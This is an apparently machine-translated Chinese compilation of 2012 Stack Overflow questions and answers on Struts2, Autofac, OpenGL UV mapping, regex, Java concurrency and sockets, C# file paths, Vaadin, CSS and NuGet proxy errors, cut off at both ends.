这与 Swing 本身几乎没有关系，而与持久性有关：您要做的是设置一个对象（或一组对象）的状态，并在程序退出时让它保持不变。有几种方法可以做到这一点，包括序列化、使用 XML bean 或 JAXB 或属性的 XML 序列化（我喜欢）。我建议检查 JAXB 并通过将状态编组和解组为 XML 来保持类的状态。否则，如果您有很多必须保留的信息，请考虑使用数据库。

# struts - Struts2 一个类中的多个动作

> ID：11553560
> 
> 赞同：0
> 
> 时间：2012-07-19T03:35:34.493
> 
> 标签：struts

我正在使用Struts2。我有两个具有相同代码的 Web 表单。我想消除一种形式。这是我的 Struts 项目的结构。

```
\Web Pages
  form.jsp
  \WEB-INF
    \Content
      error.jsp
      form.jsp
      success.jsp
\Source Packages
  \action
    MyAction.java 
```

MyAction.java

```
package action;

import com.opensymphony.xwork2.ActionSupport;
import org.apache.struts2.convention.annotation.*;

public class MyAction extends ActionSupport {

  @Action(value = "foo", results = {
    @Result(name = "input", location = "form.jsp"),
    @Result(name = "success", location = "success.jsp"),
    @Result(name = "error", location = "error.jsp")
  })
  public String execute() throws Exception {
    if (user.length() == 1) {
      return "success";
    } else {
      return "error";
    }
  }

  private String user = "";

  public void validate() {
    if (user.length() == 0) {
      addFieldError("user", getText("user required"));
    }
  }

  public String getUser() {
    return user;
  }

  public void setUser(String user) {
    this.user = user;
  }
} 
```

我试图通过向 MyAction.java 添加一个新的操作方法来消除 \Web Pages 下的 form.jsp。

```
 @Action(value="bar", results = {
    @Result(name = "success", location = "form.jsp"),
  })
  public String another() {
    return "success";
  } 
```

但是当我转到 http 时出现以下错误：//localhost .../bar.action

HTTP 状态 404 - 未为操作 action.MyAction 和结果输入定义结果

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T09:15:30.900

您的 MyAction 具有 validate() 的实现，这意味着它可以识别验证。

发生的事情是您正在调用另一个，但 validate() 正在启动（因为它在拦截器堆栈中）。验证失败，因此发送到 INPUT 结果，该结果未在另一个中定义。

你应该

1.  如果您不想在那里进行验证，请将 @SkipValidation 添加到另一种方法
2.  如果需要默认输入结果，请将 INPUT 结果添加到 another()

更笼统地说，当您遇到这种错误（未为操作 X 和结果输入定义结果）时，通常意味着您遇到验证错误、参数填充错误（例如：准备中的异常）。

# c# - Autofac注册问题

> ID：11553562
> 
> 赞同：3
> 
> 时间：2012-07-19T03:35:46.310
> 
> 标签：c#, autofac, outlook-addin

我对 Autofac 很陌生并且遇到了问题。

以下代码是我如何注册我的依赖项，然后我检查它们是否都已注册（blah1/blah2）并且都返回“true”。

```
public AddInBootstrapper(Microsoft.Office.Interop.Outlook.NameSpace session)
    {
        var containerBuilder = new ContainerBuilder();

        containerBuilder.Register(c => new OutlookService(session)).As<IOutlookService>();
        containerBuilder.RegisterType<EmailPrintService>().As<IPrintService<Microsoft.Office.Interop.Outlook.MailItem>>();

        _container = containerBuilder.Build();

        var blah1 = _container.IsRegistered<IOutlookService>();
        var blah2 = _container.IsRegistered<IPrintService<Microsoft.Office.Interop.Outlook.MailItem>>();
    } 
```

当我稍后单击已连接的 Outlook 功能区按钮时，第一个 (blah1) 显示为仍已注册，第二个 (blah2) 返回“假”

```
private void printNowButton_Click(object sender, RibbonControlEventArgs e)
    {
        var blah1 = Globals.ThisAddIn.Core.IsRegistered<IOutlookService>();
        var blah2 = Globals.ThisAddIn.Core.IsRegistered<IPrintService<Microsoft.Office.Interop.Outlook.MailItem>>();

        var outlookSvc = Globals.ThisAddIn.Core.Resolve<IOutlookService>();
        var printSvc = Globals.ThisAddIn.Core.Resolve<IPrintService<Microsoft.Office.Interop.Outlook.MailItem>>();

        var folder = outlookSvc.GetFolder(@"public folders\all public folders\testpf\docprinttest\anotherfolder");

        foreach (Microsoft.Office.Interop.Outlook.MailItem item in folder.Items)
        {
            if (item.Attachments.Count > 0)
            {
                // print attachments
            }

            printSvc.PrintItem(item);
        }
    } 
```

有任何想法吗？

**编辑（这里是其余的代码）：**

该过程在 Outlook 加载项加载时开始：

```
public partial class ThisAddIn
{
    private AddInBootstrapper _core;
    public AddInBootstrapper Core
    {
        get { return _core; }
    }

    private void ThisAddIn_Startup(object sender, System.EventArgs e)
    {
    }

    private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
    {
        _core.Dispose();
    }

    public override void BeginInit()
    {
        _core = new AddInBootstrapper(this.Application.Session);

        base.BeginInit();
    }

    // some VSTO generated code here (non-modified)
} 
```

IPrintService.cs：

```
namespace MRP.Outlook.DocPrint.Core.Services.Interfaces
{
  public interface IPrintService<T>
  {
      void PrintItem(T item);
  }
} 
```

电子邮件打印服务.cs：

```
namespace MRP.Outlook.DocPrint.Core.Services
{
  public class EmailPrintService : IPrintService<Microsoft.Office.Interop.Outlook.MailItem>
{
    public EmailPrintService()
    {
    }

    public void PrintItem(Microsoft.Office.Interop.Outlook.MailItem item)
    {
        //item.PrintOut();
        System.Diagnostics.Debug.WriteLine("Printing: " + item.Subject);
    }
  }
} 
```

就是这样，加载项加载，它们都已注册，我单击按钮 - 一个已注册，一个未注册。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T18:09:47.447

做一个完全不知情的猜测，`Microsoft.Office.Interop.Outlook.MailItem`嵌入式互操作程序集中是否有 COM 类型？（请参阅 .NET 4 中的“无 PIA”功能）。

如果是这样，则可能存在该类型的多个副本，仅通过应用于它们的 GUID 绑定在一起。CLR 允许这样做，将它们视为可相互分配的，但是当比较类型时（例如查找注册），它们会有所不同。

我不知道直接的解决方法，但您可以通过创建自己的`MailItem`包装 Outlook 的类型来测试这个理论。使用您自己的类型作为泛型参数应该可以解决该问题。祝你好运！

# opengl - OpenGL中球体的UV坐标有问题？

> ID：11553567
> 
> 赞同：2
> 
> 时间：2012-07-19T03:36:25.243
> 
> 标签：opengl, geometry, coordinates, texture-mapping, uv-mapping

我的球体上有错误的纹理贴图。这个问题众所周知，但解决方案很少。

这是我为球体生成 UV 的代码。

T = 三角形，Nv = 顶点法线。

```
for (int i=0; i<nbF; i++)
{
    float tx1 = atan2(Nv[T[i].v1].x, Nv[T[i].v1].z) / (2.0f*M_PI) + 0.5f;
    float ty1 = asinf(Nv[T[i].v1].y) / M_PI + 0.5f;

    float tx2 = atan2(Nv[T[i].v2].x, Nv[T[i].v2].z) / (2.0f*M_PI) + 0.5f;
    float ty2 = asinf(Nv[T[i].v2].y) / M_PI + 0.5f;

    float tx3 = atan2(Nv[T[i].v3].x, Nv[T[i].v3].z) / (2.0f*M_PI) + 0.5f;
    float ty3 = asinf(Nv[T[i].v3].y) / M_PI + 0.5f;

    float n = 0.75f;

    if(tx2 < n && tx1 > n)
        tx2 += 1.0;
    else if(tx2 > n && tx1 < n)
        tx2 -= 1.0;

    if(tx3 < n && tx2 > n)
        tx3 += 1.0;
    else if(tx3 > n && tx2 < n)
        tx3 -= 1.0;

    out_UV[T[i].v1].u = tx1;
    out_UV[T[i].v1].v = ty1; 

    out_UV[T[i].v2].u = tx2;
    out_UV[T[i].v2].v = ty2;

    out_UV[T[i].v3].u = tx3;
    out_UV[T[i].v3].v = ty3;
} 
```

输出： http: [//i.stack.imgur.com/luhgZ.jpg](https://i.stack.imgur.com/luhgZ.jpg) ![在此处输入图像描述][1]

如图所示，我的代码在球体的一侧生成长条。解决方案在这里.. [http://sol.gfxile.net/sphere/index.html](http://sol.gfxile.net/sphere/index.html)但无法弄清楚.. 我该如何解决这个问题？有什么建议吗？

```
# Update 1:# 
```

这段代码对我也不起作用。我不知道它有什么问题。仍然是我得到的同样丑陋的接缝。？？？

```
for (int i=0; i<nbV; i++)
{
    out_UV[i].u = (float) atan2(Nv[i].x, Nv[i].z) / (2.0f*M_PI) + 0.5f;
    out_UV[i].v =  (float) (asin(Nv[i].y) / M_PI) + 0.5f;
}

float nx = 0.9f;
float nv = 0.8f;
for (int i=0; i<nbV-2; i++)
{
    if (out_UV[i].u - out_UV[i+1].u > nx)
        out_UV[i+1].u += 1.0f;
    if (out_UV[i+1].u - out_UV[i].u > nx)
        out_UV[i].u += 1.0f;

    if (out_UV[i].u - out_UV[i+2].u > nx)
        out_UV[i+2].u += 1.0f;
    if (out_UV[i+2].u - out_UV[i].u > nx)
        out_UV[i].u += 1.0f;

    if (out_UV[i+1].u - out_UV[i+2].u > nx)
        out_UV[i+2].u += 1.0f;
    if (out_UV[i+2].u - out_UV[i+1].u > nx)
        out_UV[i+1].u += 1.0f;

    if (out_UV[i].v - out_UV[i+1].v > nv)
        out_UV[i+1].v += 1.0f;
    if (out_UV[i+1].v - out_UV[i].v > nv)
        out_UV[i].v += 1.0f;

    if (out_UV[i].v - out_UV[i+2].v > nv)
        out_UV[i+2].v += 1.0f;
    if (out_UV[i+2].v - out_UV[i].v > nv)
        out_UV[i].v += 1.0f;

    if (out_UV[i+1].v - out_UV[i+2].v > nv)
        out_UV[i+2].v += 1.0f;
    if (out_UV[i+2].v - out_UV[i+1].v > nv)
        out_UV[i+1].v += 1.0f;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-19T05:29:54.823

问题是因为您将 texcoords 包裹在球体周围。

如果我把你的地球的水平切片拉平，x texcoords 看起来像这样；

```
0.7    0.8    0.9     0     0.1    0.2    0.3    0.4
 |------|------|------|------|------|------|------| 
                ^^^^^^
                      |-wrapping around here 
```

丑陋的接缝来自我用克拉标记的区域`(^)`。在所有其他顶点之间，纹理坐标很好地插值从`n`到`n+0.1`。然而，在最后一对顶点上，它一直在`0.9`和之间进行插值`0`，这意味着它会将整个纹理翻转并挤压到单个接缝中（这是您看到的丑陋撕裂。

要解决这个问题，您需要在接缝周围创建一对重复的顶点，纹理坐标为 1.0。这些应该直接位于原始顶点的顶部，并且它们可能不应该连接到它们。texcoord 应该是这样的：

```
 1.0
0.7    0.8    0.9     |0     0.1    0.2    0.3    0.4
 |------|------|------||------|------|------|------| 
```

1.0 和 0 相互重叠。然后顶点之间的所有区域将被均匀地插值。

# c# - 如何使这个正则表达式允许空格 c#

> ID：11553568
> 
> 赞同：7
> 
> 时间：2012-07-19T03:36:25.437
> 
> 标签：c#, regex

我有一个带有以下正则表达式的电话号码字段：

```
[RegularExpression(@"^[0-9]{10,10}$")] 
```

这会检查输入是否正好是 10 个数字字符，我应该如何更改此正则表达式以允许空格使以下所有示例都有效

```
1234567890
12 34567890
123 456 7890 
```

干杯！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-19T03:45:47.810

这有效：

```
^(?:\s*\d\s*){10,10}$ 
```

解释：

```
^ - start line
(?: - start noncapturing group
\s* - any spaces
\d - a digit
\s* - any spaces
) - end noncapturing group
{10,10} - repeat exactly 10 times
$ - end line 
```

这种构造这个正则表达式的方式也是相当可扩展的，以防你不得不忽略任何其他字符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T03:53:12.957

用这个：

```
^([\s]*\d){10}\s*$ 
```

我作弊了 :) 我刚刚在这里修改了这个正则表达式：

[正则表达式计算字符串中逗号的数量](https://stackoverflow.com/questions/863125/regular-expression-to-count-number-of-in-string)

我测试过。这对我来说可以。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T21:45:04.193

根据您的问题，您可能会考虑使用匹配评估器委托，如[http://msdn.microsoft.com/en-us/library/system.text.regularexpressions.matchevaluator.aspx中所述](http://msdn.microsoft.com/en-us/library/system.text.regularexpressions.matchevaluator.aspx)

这将使计算数字和/或空格的问题变得简单

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T03:42:03.167

使用这个简单的正则表达式

~~`var matches = Regex.Matches(inputString, @"([\s\d]{10})");`~~

**编辑**

```
var matches = Regex.Matches(inputString, @"^((?:\s*\d){10})$"); 
```

解释：

```
 ^             the beginning of the string

  (?: ){10}      group, but do not capture (10 times):

  \s*            whitespace (0 or more times, matching the most amount possible)

  \d             digits (0-9)

  $              before an optional \n, and the end of the string 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-19T03:48:33.833

我认为这样的事情`^\d{2}\s?\d\s?\d{3}\s?\d{4}$`

有变体： 10 位或 2 位空格 8 位或 3 位空格 3 位空格 4 位。

但是，如果您只想要这 3 个变体，请使用类似这样的东西

```
^(?:\d{10})|(?:\d{2}\s\d{8})|(?:\d{3}\s\d{3}\s\d{4})$ 
```

# java - LinkedList 迭代器抛出并发修改异常

> ID：11553570
> 
> 赞同：1
> 
> 时间：2012-07-19T03:36:41.437
> 
> 标签：java, multithreading, linked-list, concurrentmodification

有没有办法阻止 ListIterator 抛出 ConcurrentModificationException？这就是我想要做的：

*   使用一堆对象创建一个 LinkedList，这些对象具有要经常执行的特定方法。
*   有一定数量的线程（比如 N），所有这些线程都负责执行 LinkedList 中对象的上述方法。例如，如果列表中有 k 个对象，线程 n 将执行列表中第 n 个对象的方法，然后继续执行第 n+N 个对象，然后执行第 n+2N 个，以此类推，直到它循环回到开头。

这里的问题在于这些对象的检索。我显然会使用 ListIterator 来完成这项工作。但是，我预测这不会走得太远，这要归功于根据文档将抛出的 ConcurrentModificationException。我希望列表是可修改的，并且迭代器不在乎。事实上，预计这些对象会创建和销毁列表中的其他对象。我想到了一些解决方法：

*   创建和销毁一个新的迭代器以检索给定索引处的对象。但是，这是 O(n)，不可取。
*   改为使用 ArrayedList；然而，这也是不可取的，因为删除是 O(n) 并且列表需要不时扩展（也许是收缩？）存在问题。
*   编写我自己的 LinkedList 类。不想。

因此，我的问题。有没有办法阻止 ListIterator 抛出 ConcurrentModificationException？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:39:11.327

你似乎关心性能。您是否实际测量过使用 O(n) 与 O(1) 算法对性能的影响？根据您正在做什么以及您执行它的频率，简单地使用`CopyOnWriteArrayList`线程安全的可能是可以接受的。它的迭代器也是线程安全的。

主要的性能拖累是可变操作（设置、添加、删除...）：每次都重新创建一个新列表。

但是，对于大多数应用程序来说，性能已经足够好了。我个人会尝试使用它，分析我的应用程序以检查性能是否足够好，如果是的话就继续。如果不是，您将需要寻找其他方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T13:58:26.500

> 有没有办法阻止 ListIterator 抛出 ConcurrentModificationException？

您以这种方式提出这个问题表明对如何正确使用线程来提高应用程序的性能缺乏了解。

使用线程的全部目的是将处理和 IO 划分为单独的可运行实体，这些实体可以并行执行——彼此*独立。*如果您将线程分叉以使所有线程都在同一工作，`LinkedList`那么您很可能会*损失*性能或获得最小的收益，因为保持每个线程的“视图”同步所需的同步开销`LinkedList`将抵消由于以下原因而产生的任何收益并行执行。

问题*不*应该是“我如何停止`ConcurrentModificationException`”，而应该是“我如何使用线程来改进对象列表的处理”。这是正确的问题。

要与多个线程并行处理对象集合，您应该使用`ExecutorService`线程池。您可以使用类似于以下代码的内容创建池。`LinkedList`然后（在此示例中）中的每个条目`Job`将由池中的线程并行处理。

```
// create a thread pool with 10 workers
ExecutorService threadPool = Executors.newFixedThreadPool(10);
// submit each of the objects in the list to the pool
for (Job job : jobLinkedList) {
    threadPool.submit(new MyJobProcessor(job));
}
// once we have submitted all jobs to the thread pool, it should be shutdown
threadPool.shutdown();
// wait for the thread-pool jobs to finish
threadPool.awaitTermination(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
synchronized (jobLinkedList) {
    // not sure this is necessary but we need to a memory barrier somewhere
}
...
// you wouldn't need this if Job implemented Runnable
public class MyJobProcessor implements Runnable {
    private Job job;
    public MyJobProcessor(Job job) {
        this.job = job;
    }
    public void run() {
        // process the job
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T04:31:54.833

请参阅@assylias 的答案——他的建议很好。我要补充一点，如果您决定编写自己的链表类，则需要非常仔细地考虑如何使其成为线程安全的。

想想如果多个线程试图同时修改你的列表可能会被破坏的所有方式。仅仅锁定 1 或 2 个节点是不够的——例如，以下面的列表为例：

A -> B -> C -> D

想象一下，一个线程试图删除 B，就像另一个线程正在删除 C。要删除 B，从 A 的链接需要“跳过”B 到 C。但是如果到那时 C 不再是列表的一部分怎么办？同样，要删除 C，需要将来自 B 的链接更改为跳转到 D，但是如果此时 B 已经从列表中删除了怎么办？当节点同时添加到列表的附近部分时，也会出现类似的问题。

如果每个节点有 1 个锁，并且在执行“删除”操作时锁定 3 个节点（要删除的节点，以及它之前和之后的节点），我认为这将是线程安全的。*您还需要仔细考虑在添加节点以及遍历*列表时必须锁定哪些节点。为了避免死锁，您需要确保始终以恒定的顺序获取锁，并且在遍历列表时，您需要使用“hand-over-hand”锁定（这排除了使用普通 Java 监视器 - 您需要显式锁定对象）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T04:11:39.197

您可以使用 one`Iterator`来扫描列表，并使用 an`Executor`通过传递给线程池来对每个对象执行工作。这很容易。以这种方式打包工作单元是有开销的。您仍然必须小心使用`Iterator`方法来修改列表，但这可能会简化问题。

或者你可以一次完成你的工作，然后在下一次列出修改？

你能分成N个列表吗？

# java - 从套接字读取时获取空字符串

> ID：11553571
> 
> 赞同：2
> 
> 时间：2012-07-19T03:36:50.527
> 
> 标签：java, sockets, client-server

我正在尝试使用 Java 中的 Sockets 编写客户端-服务器系统，但是我似乎无法读取从服务器发送到客户端的数据。

这是客户端的代码：

```
public class ClientSocket 
{
    Socket clientSocket = null;
    PrintWriter out = null;
    BufferedReader in = null;

    // establish a connection to All Care's server application through socket 4444 (adjust localhost to reflect the IP address that the server
    // is being run from)
    public ClientSocket()
    {
        try
        {
            clientSocket = new Socket("localhost", 4445);

            out = new PrintWriter(clientSocket.getOutputStream());
            in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        }
        catch (IOException e)
        {
            System.out.println("Could not connect to All Care Server Application");
        }
    }

    public void closeClientSocket()
    {   
        try
        {
            clientSocket.close();
        }
        catch (IOException e)
        {
            System.out.println("Could not close connection to All Care Server Application");
        }
    }

    public String getMessageFromServer()
    {
        try
        {
            String input = in.readLine();

            return input;
        }
        catch (IOException e)
        {
            System.out.println("Could not read message from server");
        }

        return "No Data";
    }

    public void sendMessageToServer(String message)
    {
        out.write(message);
    }
} 
```

这是服务器代码：

```
public class ArFileServer {

    public static void main(String[] args) 
    {
        ServerSocket serverSocket = null;
        boolean listening = true;

        try
        {
            serverSocket = new ServerSocket(4445);

            // infinite loop to continually listen for connection requests made by clients
            while (listening)
            {
                new ClientConnection(serverSocket.accept()).start();

                if (serverSocket != null)
                {
                    System.out.println("Connection to client established");
                }
            }

            serverSocket.close();
        }
        catch (IOException e)
        {
            System.out.println("Error could not create socket connection to port");
        }
    }
}

public class ClientConnection extends Thread
{
    private Socket socket = null;

    public ClientConnection(Socket socket) 
    {
        super("ClientConnection");
        this.socket = socket; 
    }

    // the thread that runs after a connection to the server has been accepted
    @Override
    public void run()
    {
        try
        {
            PrintWriter out = new PrintWriter(socket.getOutputStream());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            sendMessagetoClient(out, "CONNECTION SUCCESS");

            // check login credentials sent from client to the server

            // if valid send back their encrypted password, otherwise output a login error message

            // wait for user input and then do various processes based on their requests

            in.close();
            out.close();
            socket.close();
        }
        catch (IOException e)
        {
            System.out.println("Client socket connection error");
        }
    }

    // sends a message to the client
    void sendMessagetoClient(PrintWriter out, String message)
    {
        out.write(message);
    } 

    // listens for a message from the client
    String getMessageFromClient(BufferedReader in)
    {      
        try
        {
            String input = in.readLine();
            return input;
        }
        catch (IOException e)
        {
            System.out.println("Could not read message from client");
        }

        return "No Data";
    } 
```

这是我用来查看数据是否正在发送的代码行。

```
System.out.println(clientSocket.getMessageFromServer()); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:50:34.753

在您的`sendMessageToClient()`方法中，您需要刷新：

```
void sendMessagetoClient(PrintWriter out, String message)
{
    out.write(message);
    out.flush();
} 
```

* * *

或者，当您创建 时`PrintWriter`，将构造函数与`autoflush`：

```
PrintWriter out = new PrintWriter(socket.getOutputStream(),true); 
```

当你写的时候，而不是`out.write(message)`使用`printf()`or `println()`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T08:07:06.313

这里有几个问题。

1.  你在读台词，但你不是在写台词。

2.  您没有检查 readLine() 的结果是否为 null，这意味着对等方已关闭连接，这意味着您必须这样做。

3.  `PrintWriter`写完后你不会刷新。

4.  您以错误的顺序关闭事物。您必须关闭已附加到套接字的输出编写器/流。这样做会刷新它，然后关闭输入流/读取器和套接字。以错误的顺序执行此操作会失去同花顺。关闭输出后，您不需要其他两个关闭。

5.  您正在使用`PrintWriter,`which 通过网络吞下异常，您需要了解通信中的异常和错误，并且您也没有检查错误。用一个`BufferedWriter.`

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-07-19T03:44:06.213

*在 clint 代码中，您没有与服务器套接字连接。用于 clint 套接字连接*

```
socket soc= new socket ("server host ip",port); 
```

# c# - 使用 GetEnvironmentVariable 方法移动文件

> ID：11553572
> 
> 赞同：0
> 
> 时间：2012-07-19T03:37:03.207
> 
> 标签：c#, winforms

我正在使用 Program Files 的硬编码目录路径来移动文件。我现在想使用正确的方法在 Program Files 中找到该文件夹​​。

我发现这个方法做了一些谷歌搜索，这就是我想要使用的：

```
static string ProgramFilesx86()
{
    if( 8 == IntPtr.Size || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
    {
        return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
    }

    return Environment.GetEnvironmentVariable("ProgramFiles");
} 
```

不幸的是，我不确定如何实现和使用这种方法。

1.  我在我的应用程序中的哪里插入方法？
2.  我如何使用上面的而不是这个：

    ```
    if (File.Exists(@"C:\PROGRA~1\TEST\ok.txt"))
        File.Delete(@"C:\PROGRA~1\TEST\ok.txt");
    File.Copy(@"C:\PROGRA~1\PROGRAMFOLDER\ok.txt", @"C:\PROGRA~1\TEST\ok.txt"); 
    ```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T03:43:07.397

使用Program Files 获取特殊文件夹要容易*得多*

[环境.特殊文件夹](http://msdn.microsoft.com/en-us/library/system.environment.specialfolder.aspx)

```
string programFilesFolder = 
    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) 
```

继续这个例子，你可以做这样的事情

```
string pathToFile = 
    Path.Combine(programFilesFolder, @"TEST\ok.txt");

if (File.Exists(pathToFile)) 
    File.Delete(pathToFile); 
```

**更新**

修改了代码示例以始终获取 32 位 Program Files 文件夹，无论您运行的是 32 位还是 64 位操作系统，正如@Mario 指出的那样，这就是您的原始代码正在做的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T03:49:10.883

```
string fileName = Path.Combine( ProgramFilesx86(), applicationPath, @"ok.txt");

if (File.Exists( fileName ) )
{
   File.remove( fileName );
}

string sourceFile = Path.Combine( ProgramFilesx86(), @"\PROGRAMFOLDER", "ok.txt" );

File.Copy( sourceFile, fileName); 
```

**编辑：** 你不应该使用这种方法。程序文件夹取决于程序的功能而不是系统！您必须知道它们是安装到 ProgramFiles 还是 ProgramFilesX86 文件夹。然后使用 Eric J. 的答案。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-19T04:02:37.380

字符串 sourceFolder = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
string source = Path.Combine(sourceFolder, @"ok.txt");

字符串 targetFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); 字符串目标 = Path.Combine(targetFolderPath, @"ok.txt");

if (File.Exists(source))
File.Delete(source);
File.Copy(targetFolderPath, source);

# java - 异步更新 vaadin 组件

> ID：11553576
> 
> 赞同：3
> 
> 时间：2012-07-19T03:37:43.837
> 
> 标签：java, multithreading, button, vaadin

我有此代码用于每 3 秒更新一次 vaadin 按钮的标题。

```
TimerTask tt = new TimerTask() {

    @Override
    public void run() {
        try {
            logger.debug("adding l to button's caption");
            btn.setCaption(eventsButton.getCaption() + "l");
        } catch (Exception ex) {
            logger.error(ex.getMessage());
        }
    }
};
Timer t = new Timer(true);
t.scheduleAtFixedRate(tt, 0, 3000); 
```

但是，它不能改变按钮的标题，虽然它每 3 秒执行一次（由日志文件判断）。如何从另一个线程访问 vaadin 的 GUI 组件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T04:03:11.363

有一个名为 ICEPush 的插件可以满足我的需要。

[https://vaadin.com/directory#addon/icepush](https://vaadin.com/directory#addon/icepush)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T06:53:58.643

对问题进行了相当全面的讨论，并且可以在[此处](https://vaadin.com/forum/-/message_boards/view_message/231271)找到各种解决方案；Redux：'vanilla' Vaadin 只是遵循用户发起的请求-响应范例。

您需要使用附加组件从服务器启动浏览器中的更改。

另外：从您自己的线程（与正常的请求线程相反）更新组件时，您应该在应用程序对象上同步 - 因为您可能会遇到“同步”错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:56:40.100

由于 Vaadin 的工作方式，在服务器端进行的异步 UI 更改不会反映在客户端上。即使用户没有启动事务，刷新插件也可以进行 UI更改[。](https://vaadin.com/directory#addon/refresher)

```
final Refresher refresher = new Refresher();
refresher.setRefreshInterval(3000);
addComponent(refresher);

refresher.addListener(new RefreshListener() {    
    @Override
    public void refresh(final Refresher source) {
        try {
            logger.debug("adding l to button's caption");
            btn.setCaption(eventsButton.getCaption() + "l");
        } catch (Exception e) {
            logger.error(e.getMessage());
        }
    }
} 
```

# html - 图像属性高度/宽度自动导致性能渲染？

> ID：11553583
> 
> 赞同：0
> 
> 时间：2012-07-19T03:38:27.363
> 
> 标签：html, css, image

现在我面临定义图像属性高度和宽度的问题，因为我不知道服务器的尺寸。然后我考虑将`width`/分配`height`给`auto`。

例如

```
img {
    height: auto;
    width: auto;
} 
```

但我担心在没有特定`width`/的情况下渲染性能图像`height`。我希望这里的前端开发人员能够帮助解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T04:07:47.840

嘿，现在定义你的 img `width`in`100%`

像这样

```
<div class="imgtagcss">
<img src="xxx.jpg" >
</div> 
```

**CSS**

```
.imgtagcss{
width:xxx;
}
.imgtagcss img{
width:100%;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T06:20:59.503

给定宽度和高度在 css 中有 100%。因此，当加载 css 时，所有图像标签都将设置为 100%。这不会产生任何性能影响。

# printing - 如何从 .NET Compact Framework 打印到 MZ220 打印机？

> ID：11553586
> 
> 赞同：1
> 
> 时间：2012-07-19T03:38:45.930
> 
> 标签：printing, compact-framework, zebra-printers

我正在为[Motorola MC2180](http://www.windowsfordevices.com/c/a/News/Motorola-MC2180-device-profile/)开发一个带有 .NET Compact Framework 的应用程序。

此应用程序需要打印到[Zebra MZ 220 打印机](http://www.zebra.com/us/en/products-services/printers/printer-type/mobile/mz-series.html)。

如何从 .NET Compact Framework 进行打印，并为特定打印机定制它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T12:58:25.027

在这里查看我的[答案。](https://stackoverflow.com/a/3947541/64238) Zebra 为 winMobile 提供 SDK

# nuget - Visual Studio/C#：Nuget 无法连接到远程服务器

> ID：11553591
> 
> 赞同：55
> 
> 时间：2012-07-19T03:39:49.187
> 
> 标签：nuget

在 MS Visual Studio 中，我正在尝试将 Nuget 包安装到我的解决方案中。

当我选择“管理解决方案的 Nuget 包”选项并尝试安装包时，我收到消息“无法连接到远程服务器”。

我确实有 Internet 连接，所以不明白为什么我总是收到此消息。

有谁知道可以采取一些措施来纠正这个问题？

谢谢

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2013-03-23T15:45:47.997

清除 HTTP_PROXY 对我有用。

> 让我自己修
> 
> **重要提示：**此部分、方法或任务包含告诉您如何修改注册表的步骤。但是，如果您不正确地修改注册表，则可能会出现严重问题。因此，请确保您认真执行这些步骤。为了增加保护，请在修改注册表之前备份它。然后，如果出现问题，您可以恢复注册表。有关如何备份和还原注册表的详细信息，请单击以下文章编号以查看 Microsoft 知识库中的文章：322756 如何在 Windows 中备份和还原注册表
> 
> 要自行重置 Internet Explorer 代理设置，请执行以下步骤：
> 
> 1.  在 Windows XP 上，单击开始，或者在 Windows Vista 或 Windows 7 上，单击 ，然后单击运行。在 Windows 8 或 Windows 8.1 上，要访问“运行”命令，请按 Windows 徽标键 Windows 徽标键 + R。或者，从屏幕右边缘向内轻扫，然后点击搜索（或者如果您使用鼠标，请指向到屏幕的右上角，向下移动鼠标指针，然后单击搜索）。在搜索框中键入运行，然后点击或单击运行。
> 2.  在运行文本框中，复制 (CTRL+C) 并粘贴 (CTRL+V) 或键入以下内容： reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 / F
> 3.  单击确定。
> 4.  在 Windows XP 上，单击开始 ，或者在 Windows Vista 或 Windows 7 上，单击 ，然后单击运行。在 Windows 8 或 Windows 8.1 上，要访问“运行”命令，请按 Windows 徽标键 Windows 徽标键 + R。或者，从屏幕右边缘向内轻扫，然后点击搜索（或者如果您使用鼠标，请指向到屏幕的右上角，向下移动鼠标指针，然后单击搜索）。在搜索框中键入运行，然后点击或单击运行。
> 5.  在运行文本框中，复制 (CTRL+C) 并粘贴 (CTRL+V) 或键入以下内容： reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /f
> 6.  单击确定。

来自[http://support.microsoft.com/kb/2289942](http://support.microsoft.com/kb/2289942)谢谢@Sandy

* * *

## 回答 #2

> 赞同：44
> 
> 时间：2014-01-19T16:53:25.080

Solved. that's because Visual studio is using fiddler http connection.

all you have to do is to open fiddler=> fiddler option => connection => uncheck "act as system proxy on startup".

thats all!

* * *

## 回答 #3

